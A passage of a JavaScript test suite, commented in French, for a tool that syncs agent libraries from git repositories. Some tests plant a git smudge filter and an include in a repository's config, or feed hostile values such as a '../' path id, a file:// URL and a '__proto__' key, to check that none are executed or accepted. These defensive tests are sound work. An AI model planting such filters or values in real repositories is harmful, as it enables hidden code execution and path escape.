  publish('studio/agents', { 'a/AGENT.md': agentMd('A v1') });
  const W = world();
  await W.libs.add('https://github.com/studio/agents');
  g(path.join(SERVER, 'studio', 'agents'), 'branch', '-m', 'main', 'trunk');
  publish('studio/agents', { 'a/AGENT.md': agentMd('A v2') });
  const r = await W.libs.update('agents');
  assert.equal(r.ok, true, r.error);
  assert.equal(W.agents.get('a').name, 'A v2');
});

test('réglages git posés dans la bibliothèque (filtre, include) ou git-lfs sur le Mac : jamais exécutés', { skip: NO_GIT }, async () => {
  publish('studio/agents', { 'a/AGENT.md': agentMd('A v1') });
  const W = world();
  await W.libs.add('https://github.com/studio/agents');
  // une conversation écrit un filtre dans ce qui ressemble à la config d'une copie (ancienne place, version en service)
  const mark = path.join(TMP, 'filtre-copie-lance');
  const filter = path.join(TMP, 'filtre-copie.sh');
  w(filter, `#!/bin/sh\necho x >> ${J(mark)}\ncat\n`);
  fs.chmodSync(filter, 0o755);
  for (const gitDir of [path.join(W.lib('agents'), '.git'), path.join(W.copy('agents'), '.git')]) {
    fs.mkdirSync(path.join(gitDir, 'info'), { recursive: true });
    fs.appendFileSync(path.join(gitDir, 'config'), `[filter "x"]\n\tsmudge = ${filter}\n[include]\n\tpath = ../a/inclus.cfg\n`);
    fs.writeFileSync(path.join(gitDir, 'info', 'attributes'), '* filter=x\n');
  }
  publish('studio/agents', { 'a/AGENT.md': agentMd('A v2') });
  assert.equal((await W.libs.update('agents')).ok, true);
  assert.equal(W.agents.get('a').name, 'A v2');
  assert.equal(fs.existsSync(mark), false, 'le filtre n\'a jamais tourné');
  // git-lfs réglé sur le Mac (et exigé) : le fichier suivi reste son pointeur, le filtre ne tourne pas
  const pointer = 'version https://git-lfs.github.com/spec/v1\noid sha256:4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\nsize 12345\n';
  publish('studio/lfs', { '.gitattributes': '*.bin filter=lfs diff=lfs merge=lfs -text\n', 'a/AGENT.md': agentMd('A'), 'a/modele.bin': pointer });
  w(LFS, '');
  try {
    const r = await W.libs.add('https://github.com/studio/lfs');
    assert.equal(r.ok, true, r.error);
    assert.equal(fs.readFileSync(path.join(W.copy('lfs'), 'a', 'modele.bin'), 'utf8'), pointer);
    assert.equal(fs.existsSync(LFS_MARK), false, 'filtre git-lfs jamais lancé');
  } finally { fs.rmSync(LFS); }
});

test('mise à jour de fond : celles relevées il y a plus d\'une heure, une à la fois, en priorité basse, sans bruit', { skip: NO_GIT }, async () => {
  publish('studio/un', { 'a/AGENT.md': agentMd('A') });
  publish('studio/deux', { 'b/AGENT.md': agentMd('B') });
  const W = world();
  await W.libs.add('https://github.com/studio/un');
  await W.libs.add('https://github.com/studio/deux');
  resetLog();
  clock += 20 * 60_000;
  assert.deepEqual(await W.libs.tick(), [], 'relevées il y a 20 min : rien');
  assert.deepEqual(calls(), []);
  clock += 50 * 60_000;
  publish('studio/un', { 'a/AGENT.md': agentMd('A v2') });
  w(SLOW, '250');
  const [ticked, again, asked] = await Promise.all([W.libs.tick(), W.libs.tick(), W.libs.update('un')]);
  fs.rmSync(SLOW);
  assert.deepEqual([ticked, again], [['un', 'deux'], []], 'une seule mise à jour de fond à la fois');
  assert.equal(asked.ok, true);
  assert.equal(W.agents.get('a').name, 'A v2');
  // une commande git à la fois, jamais deux en même temps
  const spans = new Map();
  for (const l of lines()) { const s = spans.get(l.pid) || {}; if (l.start) s.start = l.start; if (l.end) s.end = l.end; spans.set(l.pid, s); }
  const sorted = [...spans.values()].sort((a, b) => a.start - b.start);
  for (let i = 1; i < sorted.length; i++) assert.ok(sorted[i].start >= sorted[i - 1].end, 'deux git en même temps');
  assert.equal(calls().filter((c) => c.sub === 'ls-remote').length, 3, 'deux en fond, une demandée');
  // en fond : priorité basse pour chaque git lancé (« un » a changé : 6 commandes ; « deux » non : 1 seule)
  assert.equal(W.lowered.length, 7);
  // un échec de fond : gardé dans la liste, rien d'autre
  clock += 2 * 3600_000;
  w(OFFLINE, '');
  assert.deepEqual(await W.libs.tick(), ['un', 'deux']);
  fs.rmSync(OFFLINE);
  assert.deepEqual(W.libs.view().map((l) => [l.status, l.error]), [['error', MSG.offline], ['error', MSG.offline]]);
  assert.equal(MSG.offline, 'Pas de connexion au serveur du dépôt : vérifie ta connexion à internet. Vigie réessaiera dans une heure.');
  clock += 10 * 60_000;
  assert.deepEqual(await W.libs.tick(), [], 'réessayée une heure plus tard, pas avant');
  clock += 60 * 60_000;
  assert.deepEqual(await W.libs.tick(), ['un', 'deux']);
  assert.deepEqual(W.libs.view().map((l) => l.status), ['ok', 'ok']);
});

test('git absent : jamais lancé, la phrase dit quoi installer', async () => {
  resetLog();
  assert.equal(MSG.noGit, 'git n\'est pas installé sur ton Mac : installe les outils de développement (xcode-select --install), puis réessaie.');
  for (const opts of [{ gitReady: () => false }, { gitBin: path.join(TMP, 'absent', 'git') }]) {
    const W = world(opts);
    assert.deepEqual(await W.libs.add('https://github.com/studio/agents'), { ok: false, status: 400, error: MSG.noGit });
    // une bibliothèque déjà là (ajoutée quand git y était) : ni mise à jour demandée ni de fond
    fs.mkdirSync(W.data, { recursive: true });
    fs.writeFileSync(path.join(W.data, 'agent-libraries.json'), J([{ id: 'agents', url: 'https://github.com/studio/agents', addedAt: null, checkedAt: null }]));
    const r = await W.libs.update('agents');
    assert.deepEqual([r.ok, r.error], [false, MSG.noGit]);
    clock += 2 * 3600_000;
    assert.deepEqual(await W.libs.tick(), ['agents']);
    assert.deepEqual(W.libs.view().map((l) => [l.status, l.error]), [['error', MSG.noGit]]);
    assert.deepEqual(await W.libs.remove('agents'), { ok: true, message: 'Bibliothèque retirée.' });
  }
  assert.deepEqual(calls(), [], 'git jamais lancé');
});

test('liste illisible ou modifiée à la main : rien n\'est lancé pour une adresse refusée', async () => {
  resetLog();
  const W = world();
  fs.mkdirSync(W.data, { recursive: true });
  const file = path.join(W.data, 'agent-libraries.json');
  fs.writeFileSync(file, '{ pas du json');
  assert.deepEqual(W.libs.view(), []);
  fs.writeFileSync(file, J([
    { id: 'locale', url: 'file:///Users/alex/agents' },
    { id: '../dehors', url: 'https://github.com/studio/agents' },
    // « __proto__ » : une vraie clé du fichier (JSON.parse), pas le prototype de l'objet
    { id: 'doublon', url: 'https://github.com/studio/a', agents: JSON.parse('{"__proto__":"piege","x":"Pas Un Id","y":"y","z":"y"}'), retired: [{ commit: 'nimporte' }, 'x'] },
    { id: 'doublon', url: 'https://github.com/studio/b' },
    'n\'importe quoi', null,
  ]));
  assert.deepEqual(W.libs.view().map((l) => [l.id, l.status, l.error]), [['locale', 'error', MSG.badUrl], ['doublon', 'error', MSG.missing]]);
  const d = W.libs.entries().find((e) => e.id === 'doublon');
  assert.deepEqual([[...d.agents], d.retired, Object.getPrototypeOf({})], [[['__proto__', 'piege'], ['y', 'y']], [], Object.prototype], 'ids lus sans toucher au prototype');
  const r = await W.libs.update('locale');
  assert.deepEqual([r.ok, r.error], [false, MSG.badUrl]);
  clock += 2 * 3600_000;
  assert.deepEqual(await W.libs.tick(), ['doublon'], 'l\'adresse refusée n\'est jamais mise à jour');
  assert.ok(calls().every((c) => !c.args.includes('file:///Users/alex/agents')));
  assert.deepEqual(await W.libs.remove('locale'), { ok: true, message: 'Bibliothèque retirée.' }, 'mais elle se retire');
});
